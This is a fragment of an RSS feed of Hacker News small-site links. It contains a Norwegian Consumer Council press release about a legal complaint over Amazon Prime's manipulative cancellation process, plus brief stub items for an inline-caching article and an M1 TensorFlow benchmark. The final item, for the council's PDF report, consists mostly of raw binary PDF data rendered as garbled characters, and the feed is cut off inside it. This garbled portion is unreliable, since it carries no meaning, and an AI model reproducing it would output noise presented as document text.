<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bernsteinbear.com/blog/inline-caching/">https://bernsteinbear.com/blog/inline-caching/</a></em></p>]]>
            </description>
            <link>https://bernsteinbear.com/blog/inline-caching/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25773724</guid>
            <pubDate>Thu, 14 Jan 2021 08:35:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Amazon manipulates customers, Norwegian Consumer Council files legal complaint]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25773325">thread link</a>) | @matsemann
<br/>
January 13, 2021 | https://www.forbrukerradet.no/siste-nytt/amazon-manipulates-customers-to-stay-subscribed/ | <a href="https://web.archive.org/web/*/https://www.forbrukerradet.no/siste-nytt/amazon-manipulates-customers-to-stay-subscribed/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span>
				14. januar, 2021			</span>
		</p><article>
							<p>Amazon puts obstacles in the way of consumers who wish to unsubscribe from its Amazon Prime service. Today the Norwegian Consumer Council filed a legal complaint against the company for breaches of the Unfair Commercial Practices Directive.</p><p>In the process of unsubscribing from Amazon Prime, the company manipulates consumers to continue using the service in what seems like a deliberate attempt to confuse and frustrate customers.</p>
<p>The Norwegian Consumer Council`s <a href="https://fil.forbrukerradet.no/wp-content/uploads/2021/01/complaint-against-amazon-prime.pdf">legal complaint</a>&nbsp;to the Consumer Protection Authority highlights what we believe to be Amazon´s unfair commercial practices and breaches of marketing law.</p>
<p>– It should be as easy to end a subscription as it was to subscribe in the first place. Amazon should facilitate a good user experience instead of hindering customers and tricking them into continuing paid services they do not need or want, said Director of Digital Policy at the Norwegian Consumer Council, Finn Lützow-Holm Myrstad.</p>
<p>– In our view, this practice not only betrays the expectations and trust of consumers but breaches European law.</p>
<h2><strong>One out of four consumers struggle to unsubscribe </strong></h2>
<p>The Norwegian Consumer Council <a href="https://fil.forbrukerradet.no/wp-content/uploads/2021/01/population-survey-digital-content.pdf">surveyed 1,000 Norwegian consumers</a> and analysed their experience. One out of four Norwegian consumers reported difficulties unsubscribing from digital content services. Twenty-five percent of consumers surveyed reported that they pay for one or more subscriptions that they use with such infrequency that they might as well end the subscription.</p>
<p>– Most of us use digital content services to watch movies, listen to music or audiobooks, play video games, or read the news. At the same time, many consumers experience issues with subscriptions being very easy to sign up for, but difficult to get out of, said Finn Myrstad.</p>
<p>– Companies such as Amazon seem to speculate that they can discourage customers from cancelling their subscriptions either by heavily emphasizing the benefits that will be lost upon cancellation or by making the process so complicated that its users simply give up.</p>
<h2><strong>Amazon manipulates users into staying by using dark patterns</strong></h2>
<p><iframe src="https://www.youtube-nocookie.com/embed/GpEQ4OWNO4Y" width="650" height="433" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
<p><a href="https://fil.forbrukerradet.no/wp-content/uploads/2021/01/2021-01-14-you-can-log-out-but-you-can-never-leave-final.pdf">The Norwegian Consumer Council’s study</a> analysed the cancellation process for Amazon Prime. The analysis shows that consumers who want to leave the service are faced with a large number of hurdles, including complicated navigation menus, skewed wording, confusing choices, and repeated nudging. Throughout the process, Amazon manipulates users through wording and graphic design, making the process needlessly difficult and frustrating to understand.</p>
<p>– Unfortunately, using <em>dark patterns</em>, or manipulative design, is a common practice online. Consumers are constantly bombarded by a variety of subtle and less subtle attempts to push us into making choices that favour the companies at the cost of our own time, attention, and money, said Myrstad.</p>
<h2><strong>A global problem requires global solutions</strong></h2>
<p>16 different consumer organizations in Europe and the United States are now taking action against Amazon based on the report by the Norwegian Consumer Council. They will each ask their respective consumer authorities to investigate the use of dark patterns in their countries.</p>
<p>This international campaign builds upon the Norwegian Consumer Council’s joint 2018 campaign with seven other European consumer organizations against Google’s use of dark patterns. The complaint, which the Irish Data Protection Commissioner’s office is still investigating, uncovered how Google manipulates users into turning on comprehensive location tracking.</p>
<p>– The Consumer Protection Authority can set an important precedent by issuing a decision against Amazon. A decision in favour of the complaint would mark that the use of dark patterns is not in accordance with European law and would elevate the rights of consumers.</p>
<span><a href="https://fil.forbrukerradet.no/wp-content/uploads/2021/01/2021-01-14-you-can-log-out-but-you-can-never-leave-final.pdf">Report: You can log out but you can never leave</a></span>
							</article><div>
			<div><p><img width="650" height="381" src="https://fil.forbrukerradet.no/wp-content/uploads/2015/09/FPA_Finn_Myrstad-650x381.jpg" alt="Bilde av ansatt: Finn Myrstad" loading="lazy" srcset="https://www.forbrukerradet.no/wp-content/uploads/2015/09/FPA_Finn_Myrstad-650x381.jpg 650w, https://www.forbrukerradet.no/wp-content/uploads/2015/09/FPA_Finn_Myrstad-250x146.jpg 250w, https://www.forbrukerradet.no/wp-content/uploads/2015/09/FPA_Finn_Myrstad-120x70.jpg 120w" sizes="(max-width: 650px) 100vw, 650px" data-src="https://fil.forbrukerradet.no/wp-content/uploads/2015/09/FPA_Finn_Myrstad-650x381.jpg"></p><p>Finn Myrstad</p><p>Fagdirektør digitale tjenester</p><p>(+47) 479 66 900</p><p>finn.myrstad@forbrukerradet.no</p></div><div><p><img width="650" height="381" src="https://fil.forbrukerradet.no/wp-content/uploads/2015/09/KE_Oyvind_Herseth_Kaldestad-650x381.jpg" alt="Bilde av ansatt: Øyvind Herseth Kaldestad" loading="lazy" srcset="https://www.forbrukerradet.no/wp-content/uploads/2015/09/KE_Oyvind_Herseth_Kaldestad-650x381.jpg 650w, https://www.forbrukerradet.no/wp-content/uploads/2015/09/KE_Oyvind_Herseth_Kaldestad-250x146.jpg 250w, https://www.forbrukerradet.no/wp-content/uploads/2015/09/KE_Oyvind_Herseth_Kaldestad-120x70.jpg 120w" sizes="(max-width: 650px) 100vw, 650px" data-src="https://fil.forbrukerradet.no/wp-content/uploads/2015/09/KE_Oyvind_Herseth_Kaldestad-650x381.jpg"></p><p>Øyvind H. Kaldestad</p><p>Pressekontakt / Kommunikasjonsrådgiver</p><p>(+47) 480 82 619 </p><p>ohk@forbrukerradet.no</p></div>			<div><h3 id="tittel">About Amazon Prime and Dark Patterns</h3>
			<hr><p><strong>Amazon Prime</strong></p>
<p>A subscription to Amazon Prime provides discounts, shipping benefits, and access to other Amazon services. The Amazon Prime service has more than 150 million subscribers worldwide. Amazon’s European headquarters is in Luxembourg.</p>
<p><strong>Dark patterns</strong></p>
<p>Dark patterns, or manipulative design, are features of user interface design that nudge or push consumers into making choices that are in the best interest of the service provider, rather than in the interest of the consumer. This may include that certain options are easier to choose than others, that consumers are tricked into giving consent to sharing personal data, and many other practices.</p>
<p><a href="https://www.forbrukerradet.no/dark-patterns/">Se more about The Consumer Council’s work on dark patterns and cunning design.</a></p>
</div>						<p>
				<span>
					<a href="https://www.forbrukerradet.no/nyhetsvarsling">Subscribe to news in English</a>
				</span>
			</p>
		</div></div>]]>
            </description>
            <link>https://www.forbrukerradet.no/siste-nytt/amazon-manipulates-customers-to-stay-subscribed/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25773325</guid>
            <pubDate>Thu, 14 Jan 2021 07:35:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Analyzing the performance of Tensorflow training on M1 Mac Mini and Nvidia V100]]>
            </title>
            <description>
<![CDATA[
Score 222 | Comments 81 (<a href="https://news.ycombinator.com/item?id=25773109">thread link</a>) | @briggers
<br/>
January 13, 2021 | https://wandb.ai/vanpelt/m1-benchmark/reports/Can-Apple-s-M1-help-you-train-models-faster-cheaper-than-NVIDIA-s-V100---VmlldzozNTkyMzg | <a href="https://web.archive.org/web/*/https://wandb.ai/vanpelt/m1-benchmark/reports/Can-Apple-s-M1-help-you-train-models-faster-cheaper-than-NVIDIA-s-V100---VmlldzozNTkyMzg">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://wandb.ai/vanpelt/m1-benchmark/reports/Can-Apple-s-M1-help-you-train-models-faster-cheaper-than-NVIDIA-s-V100---VmlldzozNTkyMzg</link>
            <guid isPermaLink="false">hacker-news-small-sites-25773109</guid>
            <pubDate>Thu, 14 Jan 2021 07:04:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Amazon manipulates consumers to keep them subscribed to Amazon Prime [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25773083">thread link</a>) | @lordlarm
<br/>
January 13, 2021 | https://fil.forbrukerradet.no/wp-content/uploads/2021/01/2021-01-14-you-can-log-out-but-you-can-never-leave-final.pdf | <a href="https://web.archive.org/web/*/https://fil.forbrukerradet.no/wp-content/uploads/2021/01/2021-01-14-you-can-log-out-but-you-can-never-leave-final.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>éØ¬îŸ/1”�\JDÂ#ÿØþ"¡¯Mß&lt;çÄ7ƒ»T)‹ ªB¢ÊÉQá#êÛO|óÍíª�ÄšF×}$Å3Ý�Œè"$ƒ’F”ƒ.FÈ\÷åà*/Dð•pE)»AVU&amp;SÊ¿‚öpH‰8ƒŒã8�ç„wQöÐa”²M|³šü~Eè„@ŸAq+ö#<d®ñ‡dzÒrdô#oƒêtôÓ„6tŸpƒ:Ïxí#tßè8ÿÁØø·þ—è>™-&lt;­¾“#å9á‡Õ%æÝ‹bùtZ†o?sYùkpß	g¾&amp;›‰ºÐ„ ­G¶u	-§Èá—hê™Êðï!Ã˜{É ù�÷ëEAE2š|ZzÊ…z“¿¯&lt;ÿ9hßx]ÐühÕ™ò=&nbsp;×£ËïÿÖûÌEw&nbsp;Øiõ�;RôÝuÁuã¹
©Þçhîí3—•Ëá¾W�ùšp/ZöCÒXàŸ¢õýhü9ÌAÓÏX¦%�©/ºí´{ž!M,;ˆò
T|Zú‹¨ˆß}z¿ñ+QÍ˜ø«húŽp¦ëB!º�_ŠÚÎ”_±µÉß`zòvŒ©ïjG? pëPªüF”ª|¥
û€¿IâËQê)/?ç‡åcõ‘ürÜ£úô{�kÂñ‘4E:Jå�&nbsp;‰§ÕuJ[¥´�ÿ¶þ{äóÉèüáÐ«$ÎÿlL=7œ©¬¼Ý0ú~§=KÉé}v¦´ákR]¤]Üócëå¨áLed÷�MçîG�1u¾‡Â¦±ig¼7ä‘YP@Qúý§ïÏOòÀs^sZ=…èGgÊÏß‚‚²�Óû�ßŒ2øÛPð´ôÔúm÷æîC5ÜßPŒ›-ÒiÜšŠŸD)Üõh÷wÃ]¨¯ú#Äcx1Š	ó!ï{"jÅrP	4UáwPˆ”á.B&gt;þ”ÉíDéÜäãŠQúßø‰ÖýÏÊsÄcûÉ^ôá—Ñxãa&lt;üøƒgž¿ùn´•PXcMàRÀþ§&nbsp;G8º^J»Œ¤3
¾Þ%€£?øÞ„¹¿ ß©éÜ˜CßZîäÐ×cò¯B¶žVO]Øú}ùÆÖ�Î9cúDt©løóÁWú7 
PNéÿŽÏ%Î`‚	y…kÐîâ?BK
B3
ò¯-B;ù8š´°ÖÃÓ÷Ö–ü€ÀÙ€.@£ˆj´Ö”.þ|´ˆß€ZùûP˜_�:ùCh5?å€ŽÔó�¢Fð!æözK“Ë�€Å€’ç´çKÿÁÏ—{¦ç¿lþ
|ˆ&gt;TÏýMáÞ@©Ü]&nbsp;#Aa^ÎçŽAú_ÀOù�úiÜ+h~uZþ›²Ü-¨�ò¸FTÎMGYÜdåê&nbsp;LÊåJP�[uÍ‚ºh¾þ¡úÿzQwJ|1ãa&lt;œ1O~û&gt;Ç
Ü(‰{]ÎËQ_�.çî\ñˆ/D—ã»/ ÷6¤C\X×6�ÝÜ„Ú¸?Š|wZÀíBu`Þ
ü;È-Ô‚­8u_:vïd&lt;Œ‡ñ0ÆÃxãa&lt;Œ‡ñ0ÆÃÿwYcŠÖ™„²u¦ÈÏ:SÌ³‰ž�’õ¦¸Ö”Ö™d�‰ÆÃxãa&lt;Œ‡ñ0ÆÃxãa&lt;Œ‡ñ0ÆÃÿ#ß€ÆÃxãa&lt;Œ‡ñ0ÆÃxãa&lt;Œ‡ñ0ÆÃxø?*pk‘PH„É€t€àX	ÿ_Ýcª,Ì‘�
hÔ¦¢„?sé¡{Ðxãa&lt;Œ‡ñ0ÆÃxãa&lt;Œ‡ñ0ÆÃxãa&lt;Œ‡ñ0ÆÃxãa&lt;Œ‡ñð¿$=ŒÆÃxøÿwà%$Ñÿ$Å¥CŒü°	Hà´�0E‘Lüo/:äG!F¨MF­h	ÚŠnG÷&nbsp;_¢ýè!ô7ô%:‰ó¸bîuo¦7Û›ç�ä-÷VùU~£ßå÷úküký[ý½þËS_<!--‰ÿ3J¬15¦£ÔX	5vB�wC�ñ3Ô˜ë-€+Ä�þ$±Æ�þíþË F5â¡/†Þ�Æ¬çç‹ÿEñã]Ð¦§ø:¾¥¢ËÐãhâPÁÐä\<òs<í�¥ïTÁÏ»ïìygBï\ôòÿŽØÿÕš!~N�¿XKþ÷Ä³ÿ‘|o?„§¹ž?$Læ›áùZøÿœÿ˜ÿ„ÿ”ÿŒÿ'ÿ/þsþ~?ŸŸÅß„dBfä„-->	£4”‰rÐ$TŽ*P
ªEõhÈ¾
-FÝhÚ€6¢-h+æ°±'ãt&lt;·áv¼Çð¼	ŸƒwàáKñeøJ|#&gt;ˆã'ñÓøü"§8�ü¶ ä‚BP
*A-h­&nbsp;ô‚Gp6žŠKp=’sô?��&lt;õÿ�Aœ“þ;÷=’&nbsp;%y*	‘iò;ùó&nbsp;·¾W.�g
äþIgäxàÿ'²úþnÆêï¸vÁ07&lt;ãðW�ÍÃ)Ðÿ&lt;ð§DóKxò·©¤ ¤Kw‡Þüá•âQ¡™sŒ[1Œ[b
P´mÏE7¬_·vÍêU±³ÏZ¹bù²žî¥K·/ZØÖÚÒ&lt;¯©±aîœÙ³fÖÏ˜&gt;mj]mMuÕ”heÅäò²I¥%ÅEs²³2ÓÃ©)¡&nbsp;Ïi5
:�Z¥TÈeÏa”Yªëð÷…;ú„phÚ´,uBBç¨„Ž&gt;?$Õ�ÍÓçï³ùÇæŒBÎe§äŒÒœÑáœØè/GåY™þÚ�¿ï¥š�·5´¿·&amp;Ôêï;.ò³D^‹D(á¯u®¨ñ÷ám_Ý9+zk;j&nbsp;¾~�º:TÝ£ÎÊDýj
°àúÒCkûqz.½vR?‡”:rÛ&gt;&gt;µ¶³»onCKm�'hÓPµXWŸ¼ºO!Öå_Iž]êïÏ&lt;Ü{Ù€-íˆh»CÝ�‹ZúøN(ÔË×öö^ÜgŠôe„jú2¶¾ë„&amp;÷ôe†jjû"!¨¬¾qø¸O–jù{¿@ðð¡ã�Mé”Rä©Æ/aI‡Å×�àÙà	¡}�y–K¢h)Dúv5´Ð¸-õÄQ4'ÒÚÇu�+‡Ù[3¹²‹].Þ
�®ªí�~ÏYáìÛµÔŸ•	ÒSá®ûûøpÇÒ®„vöô†jj¨ÜæµôEk€‰vJm­íÏÍ�ü�Ðˆ•D
-}9¡µ}ÖPÍ	~Ò+›ZÄ"R±&gt;kuêè’JõåÔÖ�çò×övÔÐ$u…ZBCo÷ú=ûP!j%ÏÑg¯†N	×ö¶t/ëóuxºA?—ù[&lt;�¾h+ˆ¯5ÔÒÓJz)dìËxnï(–‚¶�’›e&amp;-W¤*ý-œ‡o%½	þ:øU•Ã#t—%=ZUîoÁÄ²Á]¤„SDøÔêiäOŠVOóZ4|Ç#y¤g’¥ö)GÕe„„ág¢÷ùÖG£¹Éeøk{jF=à˜JeÒJµ�ù99"éÆPBIºs»Ä§ÂÈ…4ª“H/:ý}h®¿%Ôj
�Eç¶�¶Y‹ý[ßªohk{[Ò’ycbôz	�õ¡\f®t°.âaÝ*Æ§Šñáè´S.Og—Cä¹z{»ûŸJTÙÓ�EFV}ikßœHk¨oi$ Ï™•Ù¯DÚÀ¼Žj«u`îBu�!˜ëz;†v-íí�F{×Öv¬˜ã¢74½»7ÔÔRî¾±e‡g+¹·ÕãúyUP‡ªúCø’†þ(¾¤©­å!˜èý—Ìk‰s˜«î¨jíO�k-ùaS9’JIÄO"¤¦Fˆ(Åüž‡¢í¯
b‚ïÀHLS²4Œº8šf¤7
‹7Š‚OÙ5 Ð+Q–[€4%MÛEs§K¹•pÅH®&lt;Œ`"AâEúpT-‹*£ª¨–Óq R’‡”‡!¯
£ýZ¬Ãž~¨³QLÀ»úUQÏCbM�RÎ]�“¤íNƒ''ÙFU÷£
oiAs[Ë~-‚úÅOÈQEh¡sèÌ'µþn¢Û[Wôv´ë�ì&nbsp;«ð‹ûp¨õq¡
xb¹¶Oê©êÓ„ªHz%I¯¤ér’®ÍÇv�MŒnoG1Œ˜äÁt¬ñ¤JÿÀÐÐ¼–ÀKžã­K‹m-}ªLn²Ô�o*A$OíÛÕÕIž5·�²ŠÔé]­0.Y…�ezŸ
jPI5@Ž:±oP¨t­3$²�¦cWk_k„Ü´ee«8^�}hZhRŸ<lë”…É�rz{Í¡|ÑøÀxw§^lˆ ž="" 5µÐdáf­th="" -<yw.uuø©Ž4Áx¦“…ÚcszÀæáj�t‘fñ©�ºo•="" Â="" á5ÙÄæÈr­­ôáÅØÅr¸·±oo%j©�h.m'Ï¿Ã£’¬o’jpcè\0�ä¡Åšp¹o—:½f7z^)¡vxiŒ fªãmu�–kaî`†îm="" Œ="" `;Èìgôy‚�Šz{omè[ÉÊtžšª“{{•º3 òrê†©˜È¥v‘y(q8qßüµdª="" ÍèçfgdŠeÚ;#3—j�ŽÃ'àïn%¹à‘çŠ¶ì[3áq™È4-vÞk,c1,Åhgöö-]1­#�g05›úÐbkawÎòôÅ@3yÒ#°@1†&…È‡xx*atÒð°�õ­#ƒfw—¿e)(;tx×Ñ[×k\Ô®nilÒ�úvgÆt="" ãƒò@e¤9}»æú;zýàšâ†–@À£¨ø©¡n2Ì¥í™Û&º*�½dÅx*­ž="">LLË:{B˜Aúˆ¢Ò'Ï(HÃyz{C½}â¸­ƒÌP}†ÝtBàwm$ÔÙC\èeÄƒîËÖÁãŠÒ!µyjC0–{ Y”%LßRòÑÕKôöŽHÂÔkîõ—ö‚	n‡ÙCwÍï€©ŠÌH~±«;=!L'±V¨ˆfT¥’Œt�§YéoW¤Ž¤ˆ¿k"4³R¬ž¬±¥o.Ë"Ž'Â¬‹ôqŽ¸H�ÛZ˜�âÉåé Þ(h•‡”ö÷qóZ¤îËO'E=¬Ãh1Hçi|
Ï6lZä™~k:Lü”&amp;îYîiT‚|Ü3}•p¯£fîO@_úG‰þè«@�ý=Ðßý-Ð'€&gt;ô1&nbsp;�¢fXŽ¿�
óü0×
¸p CgCMi&nbsp;<fvîw¨Ð Ø¸="" ƒ¼�Ãµ;¡fŒüÜ…tn<:t7c.`ÌùŒÙÅ˜ó³“1;³�1Û³•1[s.c63æÆlbÌfÆl`Ì:Æ¬eÌÆ¬fÌ*ÆÄs6cÎbÌjÆ¬`ÌrÆ,clcºÓÅ˜¥Œédlc–0f1cÚ³ˆ1ÓÆ˜vÆ´0fcæ3¦™1óÓÄ˜fÆ40f.cæ0f6cf1f&cê3ƒ1Ó3�1ssÇ˜zÆÔ0¦š1uŒ™Â˜(c*sÁ˜ÉŒ)glc&1¦”1%Œ)flc&2¦�1ŒÉglcr“Ã˜lÆd1&“1Æl`lcÒ“Æ˜0cr“Â˜c‚Œ="" 0ÆÏc’ãelc<Œq3ÆÅ'cŒ±3ÆÆ+c,Œ13ÆÄ#c="" ŒÑ3fÇ-c4Œq3fÅ%cŒ‘3fÆ�1<c8Æ`Æ="" ‰ÁcŒi0f�1's‚1ß0ækÆ|Å˜3ækÆ|Á˜Ïó="" Æü“1Ÿ1æsÆ|Â˜�sœ11æŒù�1gÌŒyŸ1ï1æoŒy—1ï0æ¯Œ9Æ˜·óÆ¼Å˜7ógÆ¼Á˜×ó'Æü‘1¯1æŒy•1gó{ÆüŽ1¿eÌ+Œù="" c^fÌkŒy‘1="" 0æyÆ<Ç˜gó="" cžfÌsŒ9Â˜_3æwŒy’1‡ócgÌcŒy”1�0æaÆ<Ä˜ÆbÌƒŒ9È˜ŒÙÏ˜8cúÓÇ˜s?c~É˜û³�1÷2æŒ¹‡1w3æ.Æüœ1w2ægŒù)cî`ÌíŒ¹�1·2æÆÜÌ˜›s#cn`Ìos="c®cÌµŒ¹†1W3æÇŒ¹Š1W2æ" Æ\Î˜½Œ¹Œ1—2¦—1?bÌ%Œ¹˜1{sc˜Ûƒ™Ûƒ™Ûƒ™Ûƒ™Ûƒ™Ûƒ™Ûƒ™Ûƒ™Ûƒ™Ûƒ™Ûƒ™Ûƒ™Ûƒ™Ûƒ™Ûƒ™Ûƒ™Ûƒ™Ûƒ×3†ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜ù?˜¹="˜¹=˜¹=˜y;˜y;˜y;˜y;˜y;˜y;˜y;˜y;˜y;¸z?a¸ãÉ">ð™ãÉ6 ÐØùñäI@vÑØy”ìŒ'k�ì&nbsp;±í”l£d+%[âÞ)@Î�{«�l¦äJ6Ñkil%ëiâº¸·
ÈZJÖP²šfYEIŒ’³ãIµ@Î¢d%%+(YNÉ²xR
�ë¦¤‹’¥”tRÒAÉJÓrí4¶ˆ’…”´QÒJI%(™OI3%ó(i¢¤‘’JæR2‡’Ù”Ì¢d&amp;%õ”Ìˆ{¦™NÉ´¸g�©”ÔÅ=õ@jãž™@j(©¦¤Š^›BËE)©¤å*(™LI9ÍYFÉ$Z¼”’JŠ))¢d"­¬�’ZK&gt;%y”äÒÊr(É¦å²(É¤$BÉJ2(I§$�V¦$•Ö™BIˆ’ ­:@‰Ÿ–óQ’L‰—’$J&lt;”¸ãîÙ@\”8ãî9@”Øi¢�+M´Pb¦ÄD¯)1ÐD=%:J´ôš†5%*zMI‰‚yÜ5ˆ,îj"PÂÓDŽÆ0%H$xˆ’„˜ÒØIJNPò
½ö5�}EÉ¿)ù’’/âÎy@&gt;�;›€ü‹ÆþIÉg”|J¯}BcSrœ’�èµPò!Mü;%Pò&gt;%ïÑ,£±wiìû+%Ç(y›^û%oÑÄ7)ù3%oPò:Íò'û#%¯Å€ü!î˜äUJŽÒÄßSò;J~KÉ+4Ëo(y™&amp;¾DÉ‹”¼@Éó4Ës”<kŸ¡äijž¢ä%¿¦9ecorr˜’'èµÇ)yŒ&>JÉ#”<lÉc” Ðœ‡hìajrr€’ýq{%�xÜ¾h?%}”<@Éý”ü’’û(ÙgÉ½q;ØküzË="”ÜM¯ÝEÉÏ)¹“’ŸQòSJî&nbsp;ävJn£•ÝJk¹…’›éµ›(¹‘’(ù" -p="�]GÉµ”\C¯]Mkù1%WÑkWRr%—S²—’ËhÎKi¬—’Qr" %s²'nërqÜ¶È…”ìŽÛ–¹€’óã¶f="" »â60Æø¼¸­ÈnjvÐâÛi¹m”l�Ûº�l¡ÅÏ¥d3%çp²‰’�”l u¯§Å×q²6në²†v¶šæ\eiŒ’³)9‹’•´Ü="" j–Ó'[f‹÷pÒmsvq²”’nj:(ybÉbÚèvúd‹(yhÝf«n¥7j¡d}ÜùôfÍ´–y”4qÒhicÜ27n%w˜·õž·î2+nÍ2“f©§dfÜ="" ~žncÓ(™jëâÖ�@jãÖ‹�ÔÄ­ç©Ž[w©Š›ë€l¡$ji%%q3Ìïx2�•Çm­@Ê(™7Õ(¥¤$nš="" ¤8njr7µ™h¯rr7eÉ§9óâ&Ò°Ü¸‰ŒÍj²iñ,z‡lj"´²="" ”dÐÊÒ)i£$lijÜd¤”biˆÖ¤uhe~z‹�’dzÎki%jÜ”¸âÆv="" Î¸q1gÜ¸ˆ�%vj,”˜i-`¤‰jô”è(ÑÒœšsmu”()qp"§9e4§@yj8j0%(:dxê#hº|ƒ†nßiào�¾|="" i_aÚ¿_¾�|éÿü®}ñoŸ�="">‡ô�ÿ€kBüï€ïÞÓ/÷ýM¿Â÷.àÀ_Ç ím&nbsp;¼xâúàuÀŸÔ�í{M—çûÐWu1ßQ]Ø÷{Àï€ÿ­.â{ðÀËpý%H{Q·Ê÷ðÏÿðÏêÎò=£[é{Z·Â÷”n¹ï”ý5Ô÷+À“€èÐaø|ð8à1í:ß£Úõ¾G´|k7úAúƒ€ƒpí\Ûiq@?&nbsp;ð€f‹ï~ÍVß/5Û}÷ivøöivúîüpànÀ]€Ÿk²|wýà§Pæ&nbsp;·kÎöÝü­Àß¸ø›&nbsp;®¡®&nbsp;®Ÿ@Úõ€ë×®\
ø1”»
ê»R=Ûw…zŽïrõrß^õÏ}—©ïö]Ä§ú.äK|»q‰ï‚æ]ÍçïÛÕ|^óŽæ�ûv4kv`ÍÏŽúÛvìÛñÆŽ¨Y®ÞÞ¼µyÛ¾­Í[š77Ÿ»osóÃÜ´Œ»(ZÞ|Î¾MÍÂ&amp;ë¦�›øÏ7á}›pÍ&amp;œ»	sh“q“¯ÝØ¼¾yÃ¾õÍhýÜõ»Ö÷­ÊúÖ¿½žCë±z`èðþõžä:&nbsp;ÑíëuÆºuÍkš×î[Ó¼zÙªæ³àW–,o^±oyó²’îæž}ÝÍ]%K›;K:š—”´7/Þ×Þ¼¨¤­yá¾¶æÖ’–æ�~É¼ææ}óš›Jš÷54Ï)™Ý&lt;Òg•Ô7ÏÜWß&lt;£dZóô}Óš§–Ô5×BãQ’1ÉŸÄÉÌN‚'A\•ë‰zÞö|ê�§ÏsØÃ›
nŸ›Ë0¸põ^ã:Ïu…‹78ãä¢ÎŒÌ:ƒã7Ž¿8&gt;q–¨##»Ù�v¿�·‘¶ÙgÍ«ie
¥yÅ¶úì¡p�Á†
6Ÿ�«ýÄ†÷ û1FØ„WBžØæ«ãÃäµAÂøJ4/R?&nbsp;D�õ}Ê¹ûð%}©Mä3ÚÐÖ'¿¤5·-léÇøòVñ�„&gt;+y©DŒ_´w/òVÕ÷y›Zâüí·{«Zëûv&gt;ù!Â#ÈÒY¼aÓ†HKt22½múÔÄÛž0þÆÈØ`2pQ&lt;¼AïÓsäcHÏGõyÅu�OÇ‘�!o�ê …´/M;w^�AãÓpÍ•š9.ª©¬®‹j²rëNkç~ÒNzçÈÆÅð±xÃÆˆø±V¼‰D#$•ünØqò³IŒ£Èwš
È’
6²Ä�‘ÿWÿe&nbsp;oòLâ.DÝÜnÀ€ó»çvv¶¶¶¶ÎlœØØØXXXX
XˆÎœX	XXXètºK�€ÀÀb@;``!&nbsp;
Ð
h,Ì4æš�€À\ÀÀlÀ,ÀL@=``:``*&nbsp;P¨TªSQ@%&nbsp;0P(L”JÅ€"ÀD@!&nbsp;�ÈärÙ€,@&amp; ˜È¤Òa@* €à$¼€$€à¸N€`ØV€`˜F€&nbsp;èZ€&nbsp;¨J€ ÈÂ”!øäêÆ�†€AÀIÀ	À7€¯_þ
øðàsÀ¿ÿ|øð	àcÀqÀG€&gt;üðà}À{€¿Þ¼ø+ààmÀ_oÞüðàuÀŸ¼øàUÀQÀï¿üð
à7€—/^¼xðàYÀ3€§OŽ~
øàIÀaÀ€Ç�&lt;xð`pð à à`? èôÜø%à&gt;À&gt;À½€_îÜ
¸ðsÀ�€Ÿ~
¸p;à6À­€[7nÜ¸ðÀõ€ë×®\
ø1à*À•€+—ö.\
èüp	àbÀÀE¨{Ê.ãÃøÇ0þ1ŒãÃøÇ0þ1ŒãÃøÇ0þ1ŒãÃøÇ0þ1ŒãÃøÇë`0Ø6ƒ
À`0Ø6ƒ
À`0Ø6ƒ
À`0Ø6ƒ
À`0Ø6ƒ
À`0Ø6ƒ
À`0Ø6ƒ
À`0Ø6ƒ
À0þ1ŒãÃØÇ0ö1Œ}cÃØÇ0ö1Œ}cÃØÇ0ö#ãá¿	­‘ñðß´aÃ(ÇŒç’Å!Å­%®ó�—¹è,´í‚Ÿ=h/º=�Þ@KÑnàn@·£»Ð/Pz=‡^Cÿ7†ÄÙ*¤å!9² 4ôÍÐñÄ]€™~TÊÕ³þ‘”!ãÐÇ§¤}œ¸zÈ˜�›‘Z,«ã~©ÿÂƒCßÀ”ñ¡"ç.Þ –øLqkâ�ÄÝ§È&nbsp;µ¡…hjG¨ÚO¾¯³$s6Š¡Uhµ[
×–Ãç2ˆ‘o?�yù‘\kÐZÀz´mBçÀÏZà7H1rm�ß„6ÃÏ¹âwß¶¡íh‡ô¹YLÙW¶Šñs;ÑyÐ3ç£DŽQš²]ˆ.‚^»]‚~ô�±
s½èRtôóåèŠoå÷Ž‰]	?W¡ƒ&gt;\ƒ®E×¡Ÿ€^Ü„n&gt;%õz1ýFt+º
t†\»Rn9rõQô4:ˆîG&nbsp;EYv�Ô¨D˜\–‰2\2Ø-Ü=ê‰©ü6Kk'´�´­Wjé¹�~Á¨çHr$9wCNZíRËŽS$q%´�ò#-¢±kÅö�¤Ž–Êw¥2yÜ<j27‰1Â�šúmüuè�wÀ'‘*á~ <ånùÑé·ç½]Œÿ="" Ý‰~}q·È1jsîþntŒí{Ñ="">tüŒð£9JïG¿{®õ£8Ú�@O&gt;ˆ¡1ý»®�)}¿”Ny=Œ
yKó+øa)�AÚRê1�Æ…~
q’‹ÆžFÏ€…z½€^D¿AOAìeñóYˆ½‚~‡~�^Ã:à~‹þŸƒèÙ»H�¦Àòÿa�óÍh1ZŒþ™ÙÐíC_
múŠŸ†–áyà@Þ½t]+öÕ#9±©…¿"+:0ô%¿húàë²‰Ÿ}‚d`57ð¿+Ç#*E³Ðlt}ßE‘–G‘¼;š„´ÕÔ(³�ƒÂ!?ø0J„quÔ pºCnweèÐDù^Þ4}g¨Tìï¼rð­Á—sß:n.Í9ŽsÞ&lt;öÖ1ãg/›Js
